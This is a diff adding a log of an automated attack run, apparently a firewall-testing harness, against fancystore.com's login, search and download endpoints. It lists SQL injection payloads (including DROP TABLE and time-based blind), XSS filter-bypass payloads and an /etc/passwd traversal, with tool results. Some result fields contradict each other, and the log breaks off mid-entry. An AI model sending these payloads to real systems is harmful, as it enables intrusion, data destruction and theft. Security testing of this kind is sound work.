@@ -1,0 +1,2102 @@
+[*] Attacking target: http://fancystore.com
+[*] Attack file: /opt/scripts/attacks.txt
+[*] Executing attacks from line 1 to 69
+Setting up environment variables...
+Environment variables set:
+  TARGET_HOST: fancystore.com
+  TARGET_PORT: 80
+  ATTACK_TYPE: comprehensive
+  ATTACK_PHASE: automated
+  VARIANT_ID: full_attack_suite
+Starting Comprehensive Attack Script...
+Sleeping for 30 seconds before starting the attack...
+[*] ========================================
+[*] COMPREHENSIVE ATTACK EXECUTION
+[*] ========================================
+[*] Executing attacks from attack file...
+[START] Executing attacks from file at Thu Jul 31 08:38:13 UTC 2025
+[*] Attack file: /opt/scripts/attacks.txt
+[*] Total lines in attack file: 112
+[*] Total attack payloads: 69
+[*] Executing payloads 1 to 69 (out of 69 total payloads)
+===ATTACK_START===
+PAYLOAD_ID: 1
+LINE_NUM: 8
+ATTACK_TYPE: sql_injection
+TOOL: sqlmap
+DESCRIPTION: Basic SQL injection with OR condition
+METHOD: POST
+PATH: /rest/user/login
+DATA: {"email":"admin' OR '1'='1","password":"test"}
+EXPECTED: 401
+WAF_MODE: block
+TIMESTAMP: 2025-07-31T08:38:13Z
+===ATTACK_START===
+  [INFO] Generated attack headers:
+    X-Attack-ID: attack_1753951093_1959
+    X-Payload-ID: payload_1
+    X-Attack-Type: sql_injection
+    X-Timestamp: 2025-07-31T08:38:13Z
+  [REAL ATTACK] Using sqlmap for SQL injection testing...
+  [INFO] sqlmap available, using professional tool
+  [TOOL_USED] sqlmap
+  [INFO] Running sqlmap against: http://fancystore.com/rest/user/login
+  [FAILED] No SQL injection detected (HTTP 401, sqlmap: false)
+  [TOOL_STATUS] FAILED - No SQL injection indicators found
+===ATTACK_END===
+PAYLOAD_ID: 1
+RESULT: SUCCESS
+HTTP_CODE: 401
+TIMESTAMP: 2025-07-31T08:38:13Z
+===ATTACK_END===
+===ATTACK_START===
+PAYLOAD_ID: 2
+LINE_NUM: 9
+ATTACK_TYPE: sql_injection
+TOOL: sqlmap
+DESCRIPTION: SQL injection with comment
+METHOD: POST
+PATH: /rest/user/login
+DATA: {"email":"admin' --","password":"test"}
+EXPECTED: 401
+WAF_MODE: block
+TIMESTAMP: 2025-07-31T08:38:14Z
+===ATTACK_START===
+  [INFO] Generated attack headers:
+    X-Attack-ID: attack_1753951094_16432
+    X-Payload-ID: payload_2
+    X-Attack-Type: sql_injection
+    X-Timestamp: 2025-07-31T08:38:14Z
+  [REAL ATTACK] Using sqlmap for SQL injection testing...
+  [INFO] sqlmap available, using professional tool
+  [TOOL_USED] sqlmap
+  [INFO] Running sqlmap against: http://fancystore.com/rest/user/login
+  [FAILED] No SQL injection detected (HTTP 401, sqlmap: false)
+  [TOOL_STATUS] FAILED - No SQL injection indicators found
+===ATTACK_END===
+PAYLOAD_ID: 2
+RESULT: SUCCESS
+HTTP_CODE: 401
+TIMESTAMP: 2025-07-31T08:38:14Z
+===ATTACK_END===
+===ATTACK_START===
+PAYLOAD_ID: 3
+LINE_NUM: 10
+ATTACK_TYPE: sql_injection
+TOOL: sqlmap
+DESCRIPTION: SQL injection with UNION SELECT
+METHOD: POST
+PATH: /rest/user/login
+DATA: {"email":"' UNION SELECT 1,2,3--","password":"test"}
+EXPECTED: 401
+WAF_MODE: block
+TIMESTAMP: 2025-07-31T08:38:15Z
+===ATTACK_START===
+  [INFO] Generated attack headers:
+    X-Attack-ID: attack_1753951095_311
+    X-Payload-ID: payload_3
+    X-Attack-Type: sql_injection
+    X-Timestamp: 2025-07-31T08:38:15Z
+  [REAL ATTACK] Using sqlmap for SQL injection testing...
+  [INFO] sqlmap available, using professional tool
+  [TOOL_USED] sqlmap
+  [INFO] Running sqlmap against: http://fancystore.com/rest/user/login
+  [SUCCESS] SQL injection detected (HTTP 500, sqlmap: false)
+  [TOOL_OUTPUT] /tmp/sqlmap_attack/payload_2_output.json
+  [TOOL_STATUS] SUCCESS - sqlmap completed
+===ATTACK_END===
+PAYLOAD_ID: 3
+RESULT: SUCCESS
+HTTP_CODE: 500
+TIMESTAMP: 2025-07-31T08:38:15Z
+===ATTACK_END===
+===ATTACK_START===
+PAYLOAD_ID: 4
+LINE_NUM: 11
+ATTACK_TYPE: sql_injection
+TOOL: sqlmap
+DESCRIPTION: SQL injection with block comment
+METHOD: POST
+PATH: /rest/user/login
+DATA: {"email":"admin'/*","password":"test"}
+EXPECTED: 401
+WAF_MODE: block
+TIMESTAMP: 2025-07-31T08:38:16Z
+===ATTACK_START===
+  [INFO] Generated attack headers:
+    X-Attack-ID: attack_1753951096_6132
+    X-Payload-ID: payload_4
+    X-Attack-Type: sql_injection
+    X-Timestamp: 2025-07-31T08:38:16Z
+  [REAL ATTACK] Using sqlmap for SQL injection testing...
+  [INFO] sqlmap available, using professional tool
+  [TOOL_USED] sqlmap
+  [INFO] Running sqlmap against: http://fancystore.com/rest/user/login
+  [FAILED] No SQL injection detected (HTTP 401, sqlmap: false)
+  [TOOL_STATUS] FAILED - No SQL injection indicators found
+===ATTACK_END===
+PAYLOAD_ID: 4
+RESULT: SUCCESS
+HTTP_CODE: 401
+TIMESTAMP: 2025-07-31T08:38:16Z
+===ATTACK_END===
+===ATTACK_START===
+PAYLOAD_ID: 5
+LINE_NUM: 12
+ATTACK_TYPE: sql_injection
+TOOL: sqlmap
+DESCRIPTION: SQL injection with DROP TABLE
+METHOD: POST
+PATH: /rest/user/login
+DATA: {"email":"'; DROP TABLE users--","password":"test"}
+EXPECTED: 401
+WAF_MODE: block
+TIMESTAMP: 2025-07-31T08:38:17Z
+===ATTACK_START===
+  [INFO] Generated attack headers:
+    X-Attack-ID: attack_1753951097_16028
+    X-Payload-ID: payload_5
+    X-Attack-Type: sql_injection
+    X-Timestamp: 2025-07-31T08:38:17Z
+  [REAL ATTACK] Using sqlmap for SQL injection testing...
+  [INFO] sqlmap available, using professional tool
+  [TOOL_USED] sqlmap
+  [INFO] Running sqlmap against: http://fancystore.com/rest/user/login
+  [FAILED] No SQL injection detected (HTTP 401, sqlmap: false)
+  [TOOL_STATUS] FAILED - No SQL injection indicators found
+===ATTACK_END===
+PAYLOAD_ID: 5
+RESULT: SUCCESS
+HTTP_CODE: 401
+TIMESTAMP: 2025-07-31T08:38:17Z
+===ATTACK_END===
+===ATTACK_START===
+PAYLOAD_ID: 6
+LINE_NUM: 13
+ATTACK_TYPE: sql_injection
+TOOL: sqlmap
+DESCRIPTION: SQL injection with subquery
+METHOD: POST
+PATH: /rest/user/login
+DATA: {"email":"' AND (SELECT COUNT(*) FROM users)>0--","password":"test"}
+EXPECTED: 401
+WAF_MODE: block
+TIMESTAMP: 2025-07-31T08:38:18Z
+===ATTACK_START===
+  [INFO] Generated attack headers:
+    X-Attack-ID: attack_1753951098_24394
+    X-Payload-ID: payload_6
+    X-Attack-Type: sql_injection
+    X-Timestamp: 2025-07-31T08:38:18Z
+  [REAL ATTACK] Using sqlmap for SQL injection testing...
+  [INFO] sqlmap available, using professional tool
+  [TOOL_USED] sqlmap
+  [INFO] Running sqlmap against: http://fancystore.com/rest/user/login
+  [FAILED] No SQL injection detected (HTTP 401, sqlmap: false)
+  [TOOL_STATUS] FAILED - No SQL injection indicators found
+===ATTACK_END===
+PAYLOAD_ID: 6
+RESULT: SUCCESS
+HTTP_CODE: 401
+TIMESTAMP: 2025-07-31T08:38:19Z
+===ATTACK_END===
+===ATTACK_START===
+PAYLOAD_ID: 7
+LINE_NUM: 14
+ATTACK_TYPE: sql_injection
+TOOL: sqlmap
+DESCRIPTION: SQL injection with time-based blind (reduced delay)
+METHOD: POST
+PATH: /rest/user/login
+DATA: {"email":"' AND (SELECT SLEEP(1))--","password":"test"}
+EXPECTED: 401
+WAF_MODE: block
+TIMESTAMP: 2025-07-31T08:38:20Z
+===ATTACK_START===
+  [INFO] Generated attack headers:
+    X-Attack-ID: attack_1753951100_16245
+    X-Payload-ID: payload_7
+    X-Attack-Type: sql_injection
+    X-Timestamp: 2025-07-31T08:38:20Z
+  [REAL ATTACK] Using sqlmap for SQL injection testing...
+  [INFO] sqlmap available, using professional tool
+  [TOOL_USED] sqlmap
+  [INFO] Running sqlmap against: http://fancystore.com/rest/user/login
+  [SUCCESS] SQL injection detected (HTTP 500, sqlmap: false)
+  [TOOL_OUTPUT] /tmp/sqlmap_attack/payload_6_output.json
+  [TOOL_STATUS] SUCCESS - sqlmap completed
+===ATTACK_END===
+PAYLOAD_ID: 7
+RESULT: SUCCESS
+HTTP_CODE: 500
+TIMESTAMP: 2025-07-31T08:38:20Z
+===ATTACK_END===
+===ATTACK_START===
+PAYLOAD_ID: 8
+LINE_NUM: 15
+ATTACK_TYPE: sql_injection
+TOOL: sqlmap
+DESCRIPTION: SQL injection with error-based (SQL Server)
+METHOD: POST
+PATH: /rest/user/login
+DATA: {"email":"' AND 1=CONVERT(int,(SELECT @@version))--","password":"test"}
+EXPECTED: 401
+WAF_MODE: block
+TIMESTAMP: 2025-07-31T08:38:21Z
+===ATTACK_START===
+  [INFO] Generated attack headers:
+    X-Attack-ID: attack_1753951101_31392
+    X-Payload-ID: payload_8
+    X-Attack-Type: sql_injection
+    X-Timestamp: 2025-07-31T08:38:21Z
+  [REAL ATTACK] Using sqlmap for SQL injection testing...
+  [INFO] sqlmap available, using professional tool
+  [TOOL_USED] sqlmap
+  [INFO] Running sqlmap against: http://fancystore.com/rest/user/login
+  [SUCCESS] SQL injection detected (HTTP 500, sqlmap: false)
+  [TOOL_OUTPUT] /tmp/sqlmap_attack/payload_7_output.json
+  [TOOL_STATUS] SUCCESS - sqlmap completed
+===ATTACK_END===
+PAYLOAD_ID: 8
+RESULT: SUCCESS
+HTTP_CODE: 500
+TIMESTAMP: 2025-07-31T08:38:21Z
+===ATTACK_END===
+===ATTACK_START===
+PAYLOAD_ID: 9
+LINE_NUM: 20
+ATTACK_TYPE: sql_injection
+TOOL: sqlmap
+DESCRIPTION: Obfuscated AND condition with comments
+METHOD: POST
+PATH: /rest/user/login
+DATA: {"email":"admin' AnD/**/1=1--","password":"test"}
+EXPECTED: 401
+WAF_MODE: bypass
+TIMESTAMP: 2025-07-31T08:38:22Z
+===ATTACK_START===
+  [INFO] Generated attack headers:
+    X-Attack-ID: attack_1753951102_3383
+    X-Payload-ID: payload_9
+    X-Attack-Type: sql_injection
+    X-Timestamp: 2025-07-31T08:38:22Z
+  [REAL ATTACK] Using sqlmap for SQL injection testing...
+  [INFO] sqlmap available, using professional tool
+  [TOOL_USED] sqlmap
+  [INFO] Running sqlmap against: http://fancystore.com/rest/user/login
+  [FAILED] No SQL injection detected (HTTP 401, sqlmap: false)
+  [TOOL_STATUS] FAILED - No SQL injection indicators found
+===ATTACK_END===
+PAYLOAD_ID: 9
+RESULT: SUCCESS
+HTTP_CODE: 401
+TIMESTAMP: 2025-07-31T08:38:22Z
+===ATTACK_END===
+===ATTACK_START===
+PAYLOAD_ID: 10
+LINE_NUM: 21
+ATTACK_TYPE: sql_injection
+TOOL: sqlmap
+DESCRIPTION: URL-encoded SQL injection
+METHOD: POST
+PATH: /rest/user/login
+DATA: {"email":"admin'%20OR%201=1--","password":"test"}
+EXPECTED: 401
+WAF_MODE: bypass
+TIMESTAMP: 2025-07-31T08:38:23Z
+===ATTACK_START===
+  [INFO] Generated attack headers:
+    X-Attack-ID: attack_1753951103_27409
+    X-Payload-ID: payload_10
+    X-Attack-Type: sql_injection
+    X-Timestamp: 2025-07-31T08:38:23Z
+  [REAL ATTACK] Using sqlmap for SQL injection testing...
+  [INFO] sqlmap available, using professional tool
+  [TOOL_USED] sqlmap
+  [INFO] Running sqlmap against: http://fancystore.com/rest/user/login
+  [SUCCESS] SQL injection detected (HTTP 500, sqlmap: false)
+  [TOOL_OUTPUT] /tmp/sqlmap_attack/payload_9_output.json
+  [TOOL_STATUS] SUCCESS - sqlmap completed
+===ATTACK_END===
+PAYLOAD_ID: 10
+RESULT: SUCCESS
+HTTP_CODE: 500
+TIMESTAMP: 2025-07-31T08:38:23Z
+===ATTACK_END===
+===ATTACK_START===
+PAYLOAD_ID: 11
+LINE_NUM: 22
+ATTACK_TYPE: sql_injection
+TOOL: sqlmap
+DESCRIPTION: Newline-encoded SQL injection
+METHOD: POST
+PATH: /rest/user/login
+DATA: {"email":"admin'%0AOR%0A1=1--","password":"test"}
+EXPECTED: 401
+WAF_MODE: bypass
+TIMESTAMP: 2025-07-31T08:38:24Z
+===ATTACK_START===
+  [INFO] Generated attack headers:
+    X-Attack-ID: attack_1753951104_26709
+    X-Payload-ID: payload_11
+    X-Attack-Type: sql_injection
+    X-Timestamp: 2025-07-31T08:38:24Z
+  [REAL ATTACK] Using sqlmap for SQL injection testing...
+  [INFO] sqlmap available, using professional tool
+  [TOOL_USED] sqlmap
+  [INFO] Running sqlmap against: http://fancystore.com/rest/user/login
+  [SUCCESS] SQL injection detected (HTTP 500, sqlmap: false)
+  [TOOL_OUTPUT] /tmp/sqlmap_attack/payload_10_output.json
+  [TOOL_STATUS] SUCCESS - sqlmap completed
+===ATTACK_END===
+PAYLOAD_ID: 11
+RESULT: SUCCESS
+HTTP_CODE: 500
+TIMESTAMP: 2025-07-31T08:38:24Z
+===ATTACK_END===
+===ATTACK_START===
+PAYLOAD_ID: 12
+LINE_NUM: 23
+ATTACK_TYPE: sql_injection
+TOOL: sqlmap
+DESCRIPTION: Tab-encoded SQL injection
+METHOD: POST
+PATH: /rest/user/login
+DATA: {"email":"admin'%09OR%091=1--","password":"test"}
+EXPECTED: 401
+WAF_MODE: bypass
+TIMESTAMP: 2025-07-31T08:38:25Z
+===ATTACK_START===
+  [INFO] Generated attack headers:
+    X-Attack-ID: attack_1753951105_25721
+    X-Payload-ID: payload_12
+    X-Attack-Type: sql_injection
+    X-Timestamp: 2025-07-31T08:38:25Z
+  [REAL ATTACK] Using sqlmap for SQL injection testing...
+  [INFO] sqlmap available, using professional tool
+  [TOOL_USED] sqlmap
+  [INFO] Running sqlmap against: http://fancystore.com/rest/user/login
+  [SUCCESS] SQL injection detected (HTTP 500, sqlmap: false)
+  [TOOL_OUTPUT] /tmp/sqlmap_attack/payload_11_output.json
+  [TOOL_STATUS] SUCCESS - sqlmap completed
+===ATTACK_END===
+PAYLOAD_ID: 12
+RESULT: SUCCESS
+HTTP_CODE: 500
+TIMESTAMP: 2025-07-31T08:38:25Z
+===ATTACK_END===
+===ATTACK_START===
+PAYLOAD_ID: 13
+LINE_NUM: 24
+ATTACK_TYPE: sql_injection
+TOOL: sqlmap
+DESCRIPTION: CRLF-encoded SQL injection
+METHOD: POST
+PATH: /rest/user/login
+DATA: {"email":"admin'%0D%0AOR%0D%0A1=1--","password":"test"}
+EXPECTED: 401
+WAF_MODE: bypass
+TIMESTAMP: 2025-07-31T08:38:26Z
+===ATTACK_START===
+  [INFO] Generated attack headers:
+    X-Attack-ID: attack_1753951106_8861
+    X-Payload-ID: payload_13
+    X-Attack-Type: sql_injection
+    X-Timestamp: 2025-07-31T08:38:26Z
+  [REAL ATTACK] Using sqlmap for SQL injection testing...
+  [INFO] sqlmap available, using professional tool
+  [TOOL_USED] sqlmap
+  [INFO] Running sqlmap against: http://fancystore.com/rest/user/login
+  [SUCCESS] SQL injection detected (HTTP 500, sqlmap: false)
+  [TOOL_OUTPUT] /tmp/sqlmap_attack/payload_12_output.json
+  [TOOL_STATUS] SUCCESS - sqlmap completed
+===ATTACK_END===
+PAYLOAD_ID: 13
+RESULT: SUCCESS
+HTTP_CODE: 500
+TIMESTAMP: 2025-07-31T08:38:26Z
+===ATTACK_END===
+===ATTACK_START===
+PAYLOAD_ID: 14
+LINE_NUM: 25
+ATTACK_TYPE: sql_injection
+TOOL: sqlmap
+DESCRIPTION: Form-feed encoded SQL injection
+METHOD: POST
+PATH: /rest/user/login
+DATA: {"email":"admin'%0COR%0C1=1--","password":"test"}
+EXPECTED: 401
+WAF_MODE: bypass
+TIMESTAMP: 2025-07-31T08:38:27Z
+===ATTACK_START===
+  [INFO] Generated attack headers:
+    X-Attack-ID: attack_1753951107_12953
+    X-Payload-ID: payload_14
+    X-Attack-Type: sql_injection
+    X-Timestamp: 2025-07-31T08:38:27Z
+  [REAL ATTACK] Using sqlmap for SQL injection testing...
+  [INFO] sqlmap available, using professional tool
+  [TOOL_USED] sqlmap
+  [INFO] Running sqlmap against: http://fancystore.com/rest/user/login
+  [SUCCESS] SQL injection detected (HTTP 500, sqlmap: false)
+  [TOOL_OUTPUT] /tmp/sqlmap_attack/payload_13_output.json
+  [TOOL_STATUS] SUCCESS - sqlmap completed
+===ATTACK_END===
+PAYLOAD_ID: 14
+RESULT: SUCCESS
+HTTP_CODE: 500
+TIMESTAMP: 2025-07-31T08:38:27Z
+===ATTACK_END===
+===ATTACK_START===
+PAYLOAD_ID: 15
+LINE_NUM: 30
+ATTACK_TYPE: xss
+TOOL: xsstrike
+DESCRIPTION: Basic XSS with script tag
+METHOD: GET
+PATH: /rest/products/search
+DATA: q=<script>alert('XSS')</script>
+EXPECTED: 200
+WAF_MODE: block
+TIMESTAMP: 2025-07-31T08:38:28Z
+===ATTACK_START===
+  [INFO] Generated attack headers:
+    X-Attack-ID: attack_1753951108_232
+    X-Payload-ID: payload_15
+    X-Attack-Type: xss
+    X-Timestamp: 2025-07-31T08:38:28Z
+  [REAL ATTACK] Using XSStrike for XSS testing...
+  [INFO] XSStrike available, using professional tool
+  [TOOL_USED] xsstrike
+  [INFO] Running XSStrike against: http://fancystore.com/rest/products/search
+  [FAILED] No XSS detected (HTTP 200)
+  [TOOL_STATUS] FAILED - No XSS indicators found
+===ATTACK_END===
+PAYLOAD_ID: 15
+RESULT: SUCCESS
+HTTP_CODE: 200
+TIMESTAMP: 2025-07-31T08:38:28Z
+===ATTACK_END===
+===ATTACK_START===
+PAYLOAD_ID: 16
+LINE_NUM: 31
+ATTACK_TYPE: xss
+TOOL: xsstrike
+DESCRIPTION: XSS with img onerror
+METHOD: GET
+PATH: /rest/products/search
+DATA: q=<img src=x onerror=alert('XSS')>
+EXPECTED: 200
+WAF_MODE: block
+TIMESTAMP: 2025-07-31T08:38:29Z
+===ATTACK_START===
+  [INFO] Generated attack headers:
+    X-Attack-ID: attack_1753951109_18038
+    X-Payload-ID: payload_16
+    X-Attack-Type: xss
+    X-Timestamp: 2025-07-31T08:38:29Z
+  [REAL ATTACK] Using XSStrike for XSS testing...
+  [INFO] XSStrike available, using professional tool
+  [TOOL_USED] xsstrike
+  [INFO] Running XSStrike against: http://fancystore.com/rest/products/search
+  [FAILED] No XSS detected (HTTP 200)
+  [TOOL_STATUS] FAILED - No XSS indicators found
+===ATTACK_END===
+PAYLOAD_ID: 16
+RESULT: SUCCESS
+HTTP_CODE: 200
+TIMESTAMP: 2025-07-31T08:38:30Z
+===ATTACK_END===
+===ATTACK_START===
+PAYLOAD_ID: 17
+LINE_NUM: 32
+ATTACK_TYPE: xss
+TOOL: xsstrike
+DESCRIPTION: XSS with javascript protocol
+METHOD: GET
+PATH: /rest/products/search
+DATA: q=javascript:alert('XSS')
+EXPECTED: 200
+WAF_MODE: block
+TIMESTAMP: 2025-07-31T08:38:31Z
+===ATTACK_START===
+  [INFO] Generated attack headers:
+    X-Attack-ID: attack_1753951111_1259
+    X-Payload-ID: payload_17
+    X-Attack-Type: xss
+    X-Timestamp: 2025-07-31T08:38:31Z
+  [REAL ATTACK] Using XSStrike for XSS testing...
+  [INFO] XSStrike available, using professional tool
+  [TOOL_USED] xsstrike
+  [INFO] Running XSStrike against: http://fancystore.com/rest/products/search
+  [FAILED] No XSS detected (HTTP 200)
+  [TOOL_STATUS] FAILED - No XSS indicators found
+===ATTACK_END===
+PAYLOAD_ID: 17
+RESULT: SUCCESS
+HTTP_CODE: 200
+TIMESTAMP: 2025-07-31T08:38:31Z
+===ATTACK_END===
+===ATTACK_START===
+PAYLOAD_ID: 18
+LINE_NUM: 33
+ATTACK_TYPE: xss
+TOOL: xsstrike
+DESCRIPTION: XSS with SVG onload
+METHOD: GET
+PATH: /rest/products/search
+DATA: q=<svg onload=alert('XSS')>
+EXPECTED: 200
+WAF_MODE: block
+TIMESTAMP: 2025-07-31T08:38:32Z
+===ATTACK_START===
+  [INFO] Generated attack headers:
+    X-Attack-ID: attack_1753951112_8764
+    X-Payload-ID: payload_18
+    X-Attack-Type: xss
+    X-Timestamp: 2025-07-31T08:38:32Z
+  [REAL ATTACK] Using XSStrike for XSS testing...
+  [INFO] XSStrike available, using professional tool
+  [TOOL_USED] xsstrike
+  [INFO] Running XSStrike against: http://fancystore.com/rest/products/search
+  [FAILED] No XSS detected (HTTP 200)
+  [TOOL_STATUS] FAILED - No XSS indicators found
+===ATTACK_END===
+PAYLOAD_ID: 18
+RESULT: SUCCESS
+HTTP_CODE: 200
+TIMESTAMP: 2025-07-31T08:38:32Z
+===ATTACK_END===
+===ATTACK_START===
+PAYLOAD_ID: 19
+LINE_NUM: 34
+ATTACK_TYPE: xss
+TOOL: xsstrike
+DESCRIPTION: XSS with quote breaking
+METHOD: GET
+PATH: /rest/products/search
+DATA: q='"><script>alert('XSS')</script>
+EXPECTED: 200
+WAF_MODE: block
+TIMESTAMP: 2025-07-31T08:38:33Z
+===ATTACK_START===
+  [INFO] Generated attack headers:
+    X-Attack-ID: attack_1753951113_10231
+    X-Payload-ID: payload_19
+    X-Attack-Type: xss
+    X-Timestamp: 2025-07-31T08:38:33Z
+  [REAL ATTACK] Using XSStrike for XSS testing...
+  [INFO] XSStrike available, using professional tool
+  [TOOL_USED] xsstrike
+  [INFO] Running XSStrike against: http://fancystore.com/rest/products/search
+  [FAILED] No XSS detected (HTTP 200)
+  [TOOL_STATUS] FAILED - No XSS indicators found
+===ATTACK_END===
+PAYLOAD_ID: 19
+RESULT: SUCCESS
+HTTP_CODE: 200
+TIMESTAMP: 2025-07-31T08:38:33Z
+===ATTACK_END===
+===ATTACK_START===
+PAYLOAD_ID: 20
+LINE_NUM: 35
+ATTACK_TYPE: xss
+TOOL: xsstrike
+DESCRIPTION: XSS with iframe
+METHOD: GET
+PATH: /rest/products/search
+DATA: q=<iframe src=javascript:alert('XSS')>
+EXPECTED: 200
+WAF_MODE: block
+TIMESTAMP: 2025-07-31T08:38:34Z
+===ATTACK_START===
+  [INFO] Generated attack headers:
+    X-Attack-ID: attack_1753951114_7666
+    X-Payload-ID: payload_20
+    X-Attack-Type: xss
+    X-Timestamp: 2025-07-31T08:38:34Z
+  [REAL ATTACK] Using XSStrike for XSS testing...
+  [INFO] XSStrike available, using professional tool
+  [TOOL_USED] xsstrike
+  [INFO] Running XSStrike against: http://fancystore.com/rest/products/search
+  [FAILED] No XSS detected (HTTP 200)
+  [TOOL_STATUS] FAILED - No XSS indicators found
+===ATTACK_END===
+PAYLOAD_ID: 20
+RESULT: SUCCESS
+HTTP_CODE: 200
+TIMESTAMP: 2025-07-31T08:38:35Z
+===ATTACK_END===
+===ATTACK_START===
+PAYLOAD_ID: 21
+LINE_NUM: 40
+ATTACK_TYPE: xss
+TOOL: xsstrike
+DESCRIPTION: Case-mixed XSS
+METHOD: GET
+PATH: /rest/products/search
+DATA: q=<ScRiPt>alert('XSS')</ScRiPt>
+EXPECTED: 200
+WAF_MODE: bypass
+TIMESTAMP: 2025-07-31T08:38:36Z
+===ATTACK_START===
+  [INFO] Generated attack headers:
+    X-Attack-ID: attack_1753951116_17271
+    X-Payload-ID: payload_21
+    X-Attack-Type: xss
+    X-Timestamp: 2025-07-31T08:38:36Z
+  [REAL ATTACK] Using XSStrike for XSS testing...
+  [INFO] XSStrike available, using professional tool
+  [TOOL_USED] xsstrike
+  [INFO] Running XSStrike against: http://fancystore.com/rest/products/search
+  [FAILED] No XSS detected (HTTP 200)
+  [TOOL_STATUS] FAILED - No XSS indicators found
+===ATTACK_END===
+PAYLOAD_ID: 21
+RESULT: SUCCESS
+HTTP_CODE: 200
+TIMESTAMP: 2025-07-31T08:38:36Z
+===ATTACK_END===
+===ATTACK_START===
+PAYLOAD_ID: 22
+LINE_NUM: 41
+ATTACK_TYPE: xss
+TOOL: xsstrike
+DESCRIPTION: URL-encoded XSS
+METHOD: GET
+PATH: /rest/products/search
+DATA: q=<script%20src=x%20onerror=alert('XSS')>
+EXPECTED: 200
+WAF_MODE: bypass
+TIMESTAMP: 2025-07-31T08:38:37Z
+===ATTACK_START===
+  [INFO] Generated attack headers:
+    X-Attack-ID: attack_1753951117_29290
+    X-Payload-ID: payload_22
+    X-Attack-Type: xss
+    X-Timestamp: 2025-07-31T08:38:37Z
+  [REAL ATTACK] Using XSStrike for XSS testing...
+  [INFO] XSStrike available, using professional tool
+  [TOOL_USED] xsstrike
+  [INFO] Running XSStrike against: http://fancystore.com/rest/products/search
+  [FAILED] No XSS detected (HTTP 200)
+  [TOOL_STATUS] FAILED - No XSS indicators found
+===ATTACK_END===
+PAYLOAD_ID: 22
+RESULT: SUCCESS
+HTTP_CODE: 200
+TIMESTAMP: 2025-07-31T08:38:37Z
+===ATTACK_END===
+===ATTACK_START===
+PAYLOAD_ID: 23
+LINE_NUM: 42
+ATTACK_TYPE: xss
+TOOL: xsstrike
+DESCRIPTION: Comment-obfuscated XSS
+METHOD: GET
+PATH: /rest/products/search
+DATA: q=<script/**/src=x/**/onerror=alert('XSS')>
+EXPECTED: 200
+WAF_MODE: bypass
+TIMESTAMP: 2025-07-31T08:38:38Z
+===ATTACK_START===
+  [INFO] Generated attack headers:
+    X-Attack-ID: attack_1753951118_2873
+    X-Payload-ID: payload_23
+    X-Attack-Type: xss
+    X-Timestamp: 2025-07-31T08:38:38Z
+  [REAL ATTACK] Using XSStrike for XSS testing...
+  [INFO] XSStrike available, using professional tool
+  [TOOL_USED] xsstrike
+  [INFO] Running XSStrike against: http://fancystore.com/rest/products/search
+  [FAILED] No XSS detected (HTTP 200)
+  [TOOL_STATUS] FAILED - No XSS indicators found
+===ATTACK_END===
+PAYLOAD_ID: 23
+RESULT: SUCCESS
+HTTP_CODE: 200
+TIMESTAMP: 2025-07-31T08:38:38Z
+===ATTACK_END===
+===ATTACK_START===
+PAYLOAD_ID: 24
+LINE_NUM: 43
+ATTACK_TYPE: xss
+TOOL: xsstrike
+DESCRIPTION: CharCode-encoded XSS
+METHOD: GET
+PATH: /rest/products/search
+DATA: q=<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>
+EXPECTED: 200
+WAF_MODE: bypass
+TIMESTAMP: 2025-07-31T08:38:39Z
+===ATTACK_START===
+  [INFO] Generated attack headers:
+    X-Attack-ID: attack_1753951119_14122
+    X-Payload-ID: payload_24
+    X-Attack-Type: xss
+    X-Timestamp: 2025-07-31T08:38:39Z
+  [REAL ATTACK] Using XSStrike for XSS testing...
+  [INFO] XSStrike available, using professional tool
+  [TOOL_USED] xsstrike
+  [INFO] Running XSStrike against: http://fancystore.com/rest/products/search
+  [FAILED] No XSS detected (HTTP 200)
+  [TOOL_STATUS] FAILED - No XSS indicators found
+===ATTACK_END===
+PAYLOAD_ID: 24
+RESULT: SUCCESS
+HTTP_CODE: 200
+TIMESTAMP: 2025-07-31T08:38:40Z
+===ATTACK_END===
+===ATTACK_START===
+PAYLOAD_ID: 25
+LINE_NUM: 44
+ATTACK_TYPE: xss
+TOOL: xsstrike
+DESCRIPTION: setTimeout XSS
+METHOD: GET
+PATH: /rest/products/search
+DATA: q=<script>setTimeout('alert(\"XSS\")',100)</script>
+EXPECTED: 200
+WAF_MODE: bypass
+TIMESTAMP: 2025-07-31T08:38:41Z
+===ATTACK_START===
+  [INFO] Generated attack headers:
+    X-Attack-ID: attack_1753951121_15330
+    X-Payload-ID: payload_25
+    X-Attack-Type: xss
+    X-Timestamp: 2025-07-31T08:38:41Z
+  [REAL ATTACK] Using XSStrike for XSS testing...
+  [INFO] XSStrike available, using professional tool
+  [TOOL_USED] xsstrike
+  [INFO] Running XSStrike against: http://fancystore.com/rest/products/search
+  [FAILED] No XSS detected (HTTP 200)
+  [TOOL_STATUS] FAILED - No XSS indicators found
+===ATTACK_END===
+PAYLOAD_ID: 25
+RESULT: SUCCESS
+HTTP_CODE: 200
+TIMESTAMP: 2025-07-31T08:38:41Z
+===ATTACK_END===
+===ATTACK_START===
+PAYLOAD_ID: 26
+LINE_NUM: 45
+ATTACK_TYPE: xss
+TOOL: xsstrike
+DESCRIPTION: Function constructor XSS
+METHOD: GET
+PATH: /rest/products/search
+DATA: q=<script>Function('alert(\"XSS\")')()</script>
+EXPECTED: 200
+WAF_MODE: bypass
+TIMESTAMP: 2025-07-31T08:38:42Z
+===ATTACK_START===
+  [INFO] Generated attack headers:
+    X-Attack-ID: attack_1753951122_3780
+    X-Payload-ID: payload_26
+    X-Attack-Type: xss
+    X-Timestamp: 2025-07-31T08:38:42Z
+  [REAL ATTACK] Using XSStrike for XSS testing...
+  [INFO] XSStrike available, using professional tool
+  [TOOL_USED] xsstrike
+  [INFO] Running XSStrike against: http://fancystore.com/rest/products/search
+  [FAILED] No XSS detected (HTTP 200)
+  [TOOL_STATUS] FAILED - No XSS indicators found
+===ATTACK_END===
+PAYLOAD_ID: 26
+RESULT: SUCCESS
+HTTP_CODE: 200
+TIMESTAMP: 2025-07-31T08:38:42Z
+===ATTACK_END===
+===ATTACK_START===
+PAYLOAD_ID: 27
+LINE_NUM: 50
+ATTACK_TYPE: traversal
+TOOL: gobuster
+DESCRIPTION: Directory traversal via download endpoint
+METHOD: GET
+PATH: /assetsPublic/download
+DATA: wordlist=../../../../etc/passwd
+EXPECTED: 200
+WAF_MODE: block
+TIMESTAMP: 2025-07-31T08:38:43Z
+===ATTACK_START===
+  [INFO] Generated attack headers:
+    X-Attack-ID: attack_1753951123_15042
+    X-Payload-ID: payload_27
+    X-Attack-Type: traversal
+    X-Timestamp: 2025-07-31T08:38:43Z
